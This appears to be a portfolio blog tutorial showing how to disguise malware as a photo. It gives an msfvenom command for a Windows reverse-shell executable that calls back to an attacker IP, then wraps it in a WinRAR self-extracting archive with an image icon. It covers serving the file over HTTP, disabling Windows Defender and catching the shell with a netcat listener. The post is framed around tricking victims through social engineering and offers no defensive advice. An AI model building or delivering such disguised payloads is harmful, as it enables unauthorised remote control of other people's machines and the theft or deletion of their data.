---
title: "How to attach a virus to an image?"
#excerpt: "Short description of portfolio item number 1<br/><img src='/images/500x300.png'>"
excerpt: "<b> A dangerous but adorable Photo </b> <br/><img src='/images/Portfolio/How%20to%20attach%20a%20virus%20to%20an%20image/Pasted%20image%20202407191751222.png'>"
collection: portfolio
---

Have you ever wondered if a photo can carry a malware? 
The truth is yes, a photo can carry malware. But it's not easy to make.

So in this post, I will explain a simple method to embed malware inside a photo with WinRAR.

## Creating the virus

We will create a malicious file with `msfvenom`
- ``msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.0.31 LPORT=8080 -f exe -o virus.exe``

Through this command, we are specifying that:
- Our victim will be a windows machine with 64-bits architecture
- We want to obtain a reverse shell
- Our Attacking machine has the IP `192.168.0.31`
- The Listener port will be `8080`
- The file will be an executable
- We want to call it `virus.exe`

## Attaching the virus
For attaching our malicious executable to our photo we need:
- Choose two identical photos
- Convert one of these photos to format .ico
### WinRAR
- Select the virus.exe and one photo, then right-click and choose *add file*
- Select the best compression
- Create a Self-extracting file 

![Image](/images/Portfolio/How%20to%20attach%20a%20virus%20to%20an%20image/Pasted%20image%2020240719173708.png)

![Image](/images/Portfolio/How%20to%20attach%20a%20virus%20to%20an%20image/Pasted%20image%2020240715165940.png)

Click on the Advanced tab and the Self-extracting option 
![Image](/images/Portfolio/How%20to%20attach%20a%20virus%20to%20an%20image/Pasted%20image%2020240715170156.png){: style="width: 70%; height: auto; display: block; margin: 0;"}

Click on the installation tab
here we need to write the name of the files we want to be executed when the victim opens the photo.
In our case **virus.exe** and **cute-photo.jpeg**
![Image](/images/Portfolio/How%20to%20attach%20a%20virus%20to%20an%20image/Pasted%20image%2020240715170605.png)

*Click on the Text and Icon tab*
- Load icon from file
- Load the .ico file

## Send malware to our victim machine
Once we have our photo with malware, we can to send it to our victim machine, for exemple through HTTP server with Python.
- `sudo python -m http.server 80`

Now we can download the virus.exe onto victim machine.
![Image](/images/Portfolio/How%20to%20attach%20a%20virus%20to%20an%20image/Pasted%20image%2020240711091409.png)
We need to disable Windows Defender, because if it is on, the virus.exe will be deleted immediately.

## Attacker listening
Now we open a listener port with Netcat to enable communication with our reverse shell
- ``sudo nc -nlvp 8080``
	- ``-n`` *No resolving host name, that means Netcat only works with IP*
	- `-l` *listening*
	-  ``-v`` *verbose*
	- ``-p`` *port*

## When the victim clicks
This is what the victim will see if the victim has enabled the extensions.

![Image](/images/Portfolio/How%20to%20attach%20a%20virus%20to%20an%20image/Pasted%20image%2020240719175122.png)

On the other hand, there are techniques to hide the original extension, but in this post, we will not see that.

This is what the victim will see if they clicks on the image; they will see an executable that wants to install something. Sometimes, people ignore this or think that it is the correct program they need to view their photo.

![Image](/images/Portfolio/How%20to%20attach%20a%20virus%20to%20an%20image/Pasted%20image%2020240719174200.png)

At the end the victim will see the image with its correct extensión
![Image](/images/Portfolio/How%20to%20attach%20a%20virus%20to%20an%20image/Pasted%20image%2020240719174212.png)

## Attacker machine
Now, let's go back to our listener machine

![Image](/images/Portfolio/How%20to%20attach%20a%20virus%20to%20an%20image/Pasted%20image%2020240719174318.png)

When the victim machine clicks on our malicious file we obtain a reverse shell
![Image](/images/Portfolio/How%20to%20attach%20a%20virus%20to%20an%20image/Pasted%20image%2020240719174347.png)

That means we have control over the victim's pc and can navigate through directories, list, upload and download information or delete all files.
![Image](/images/Portfolio/How%20to%20attach%20a%20virus%20to%20an%20image/Pasted%20image%2020240719174942.png)

At this point, you can apply post-exploitation techniques, but we're not going to talk about that in this post 

## Conclusions
If this file is sent to many people and the addressee doesn't have much experience, it's likely that the victims will open the file without thinking too much.
So this method seems easy and has a few warning signs, but it is very likely that if this file arrives through a social engineering campaign, there may be people who fall into the trap.